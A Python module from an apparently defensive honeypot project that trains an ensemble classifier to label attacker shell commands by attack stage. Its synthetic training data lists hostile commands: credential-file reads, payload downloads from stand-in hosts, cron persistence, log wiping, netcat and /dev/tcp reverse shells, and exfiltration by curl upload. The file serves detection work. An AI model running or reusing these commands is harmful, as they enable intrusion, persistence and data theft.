"""
ShadowTrap AI X — Attack Classifier (Ensemble)
=================================================
Combines Random Forest and XGBoost classifiers for high-accuracy
attack stage and intent classification based on behavioral features
and command sequence embeddings.
"""

import os
import joblib
import numpy as np
from app.utils.logger import get_logger

logger = get_logger("ai.classifier")

MODEL_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "models")
os.makedirs(MODEL_DIR, exist_ok=True)

_rf_model = None
_xgb_model = None

STAGES = [
    "Reconnaissance", "Discovery", "Credential Discovery", "Payload Download",
    "Privilege Escalation", "Persistence", "Defense Evasion",
    "Command And Control", "Data Collection", "Exfiltration"
]


def classify_attack(commands):
    """
    Classify attack stage and intent using trained ensemble models.
    Falls back to rule-based classification if ML models are not yet trained.

    Args:
        commands: List of command strings

    Returns:
        dict: {
            "predicted_stage": str,
            "confidence": float (0-100),
            "stage_probabilities": dict,
            "method": str ("ensemble", "random_forest", "xgboost", "rule_based")
        }
    """
    if not commands:
        return {
            "predicted_stage": "Unknown",
            "confidence": 0.0,
            "stage_probabilities": {},
            "method": "none"
        }

    from app.ai.behavior_embedding import extract_behavioral_features
    features = extract_behavioral_features(commands)
    feature_vec = np.array([[
        features["total_commands"], features["unique_commands"],
        features["avg_command_length"], features["max_command_length"],
        features["has_download"], features["has_credential_access"],
        features["has_privilege_escalation"], features["has_persistence"],
        features["has_evasion"], features["has_exfiltration"],
        features["has_recon"], features["has_c2"],
        features["pipe_count"], features["redirect_count"],
        features["sudo_count"], features["unique_ratio"]
    ]])

    rf_probs = _predict_rf(feature_vec)
    xgb_probs = _predict_xgb(feature_vec)

    if rf_probs is not None and xgb_probs is not None:
        probs = (rf_probs + xgb_probs) / 2.0
        method = "ensemble"
    elif rf_probs is not None:
        probs = rf_probs
        method = "random_forest"
    elif xgb_probs is not None:
        probs = xgb_probs
        method = "xgboost"
    else:
        # Fallback to rule-based stage detector
        from app.ai.stage_detector import detect_stage
        rule_res = detect_stage(commands)
        return {
            "predicted_stage": rule_res["stage"],
            "confidence": rule_res["confidence"],
            "stage_probabilities": {s["stage"]: s["confidence"] for s in rule_res.get("all_stages", [])},
            "method": "rule_based"
        }

    best_idx = int(np.argmax(probs))
    predicted_stage = STAGES[best_idx] if best_idx < len(STAGES) else "Discovery"
    confidence = float(np.max(probs)) * 100.0

    stage_probs = {
        STAGES[i]: round(float(probs[i]) * 100, 2)
        for i in range(min(len(STAGES), len(probs)))
    }

    return {
        "predicted_stage": predicted_stage,
        "confidence": round(confidence, 2),
        "stage_probabilities": stage_probs,
        "method": method
    }


def _predict_rf(feature_vec):
    global _rf_model
    if _rf_model is None:
        rf_path = os.path.join(MODEL_DIR, "random_forest.joblib")
        if os.path.exists(rf_path):
            try:
                _rf_model = joblib.load(rf_path)
            except Exception as e:
                logger.warning(f"Failed to load RF model: {e}")
                return None
        else:
            return None
    try:
        return _rf_model.predict_proba(feature_vec)[0]
    except Exception as e:
        logger.warning(f"RF prediction error: {e}")
        return None


def _predict_xgb(feature_vec):
    global _xgb_model
    if _xgb_model is None:
        xgb_path = os.path.join(MODEL_DIR, "xgboost.joblib")
        if os.path.exists(xgb_path):
            try:
                _xgb_model = joblib.load(xgb_path)
            except Exception as e:
                logger.warning(f"Failed to load XGBoost model: {e}")
                return None
        else:
            return None
    try:
        return _xgb_model.predict_proba(feature_vec)[0]
    except Exception as e:
        logger.warning(f"XGBoost prediction error: {e}")
        return None


def train_classifier_ensemble(X=None, y=None):
    """
    Train Random Forest and XGBoost classifiers on labeled/extracted attack features.
    """
    from sklearn.ensemble import RandomForestClassifier
    try:
        import xgboost as xgb
        has_xgb = True
    except ImportError:
        has_xgb = False

    global _rf_model, _xgb_model

    if X is None or y is None:
        X, y = _generate_synthetic_training_data()

    if len(X) < 10:
        logger.warning("Not enough samples to train classifier ensemble")
        return {"status": "insufficient_data"}

    # Train Random Forest
    rf = RandomForestClassifier(n_estimators=100, max_depth=10, random_state=42)
    rf.fit(X, y)
    rf_path = os.path.join(MODEL_DIR, "random_forest.joblib")
    joblib.dump(rf, rf_path)
    _rf_model = rf

    rf_acc = rf.score(X, y)
    res = {"status": "trained", "rf_accuracy": round(rf_acc, 4)}

    # Train XGBoost if available
    if has_xgb:
        try:
            xgb_clf = xgb.XGBClassifier(n_estimators=100, max_depth=6, learning_rate=0.1, random_state=42)
            xgb_clf.fit(X, y)
            xgb_path = os.path.join(MODEL_DIR, "xgboost.joblib")
            joblib.dump(xgb_clf, xgb_path)
            _xgb_model = xgb_clf
            res["xgb_accuracy"] = round(float(xgb_clf.score(X, y)), 4)
        except Exception as e:
            logger.warning(f"XGBoost training failed: {e}")

    logger.info(f"✅ Classifier ensemble trained. RF Accuracy: {rf_acc:.2%}")
    return res


def _generate_synthetic_training_data():
    """Generates baseline feature vectors mapped to stages for bootstrapping ML."""
    from app.ai.behavior_embedding import extract_behavioral_features

    stage_sample_cmds = {
        0: ["nmap -sS -p 22,80 192.168.1.1", "ping -c 3 10.0.0.1", "dig example.com"],
        1: ["whoami", "id", "uname -a", "ip addr", "ls -la /home"],
        2: ["cat /etc/passwd", "cat /etc/shadow", "grep -i password /var/www/html/config.php"],
        3: ["wget http://malicious.bin/payload.sh -O /tmp/p.sh", "curl http://c2.server/bot -o /tmp/bot"],
        4: ["sudo -l", "sudo su", "find / -perm -4000 2>/dev/null"],
        5: ["crontab -l", "(crontab -l ; echo '* * * * * /tmp/p.sh') | crontab -", "systemctl enable backdoor"],
        6: ["history -c", "export HISTFILE=/dev/null", "rm -rf /var/log/auth.log"],
        7: ["nc -e /bin/bash 10.0.0.5 4444", "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"],
        8: ["tar czf /tmp/backup.tar.gz /home/user/documents", "mysqldump -u root -p db > /tmp/db.sql"],
        9: ["curl -F file=@/tmp/backup.tar.gz http://exfil.site/upload", "scp /tmp/db.sql user@remote:/drop"]
    }

    X, y = [], []
    for stage_idx, base_cmds in stage_sample_cmds.items():
        # Generate varied combinations
        for _ in range(5):
            features = extract_behavioral_features(base_cmds)
            vec = [
                features["total_commands"], features["unique_commands"],
                features["avg_command_length"], features["max_command_length"],
                features["has_download"], features["has_credential_access"],
                features["has_privilege_escalation"], features["has_persistence"],
                features["has_evasion"], features["has_exfiltration"],
                features["has_recon"], features["has_c2"],
                features["pipe_count"], features["redirect_count"],
                features["sudo_count"], features["unique_ratio"]
            ]
            X.append(vec)
            y.append(stage_idx)

    return np.array(X), np.array(y)
